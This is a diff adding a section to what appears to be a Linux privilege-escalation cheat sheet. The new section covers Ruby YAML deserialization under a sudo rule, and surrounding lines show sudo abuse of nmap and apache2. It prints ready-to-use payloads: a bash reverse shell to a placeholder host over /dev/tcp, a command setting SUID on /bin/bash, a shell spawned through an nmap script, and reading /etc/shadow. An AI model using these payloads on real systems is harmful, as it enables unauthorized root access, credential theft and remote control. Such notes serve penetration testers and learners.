@@ -172,7 +172,26 @@ nmap
     echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
 apache2
 
-    sudo apache2 -f /etc/shadow
+    sudo apache2 -f /etc/shadow    
+    
+# Code Execution Through Yaml Using Ruby   
+See this guide: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/    
+$ sudo -l     
+Matching Defaults entries for user on x:    
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin      
+
+User may run the following commands on x:   
+    (root) NOPASSWD: /usr/bin/ruby /sample.rb   
+
+def list_from_file   
+    YAML.load(File.read("dependencies.yml"))    
+End   
+
+
+ git_set:"bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1'"    
+ git_set: "chmod +s /bin/bash"    
+
+
 
 ## Cronjobs    
 look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 
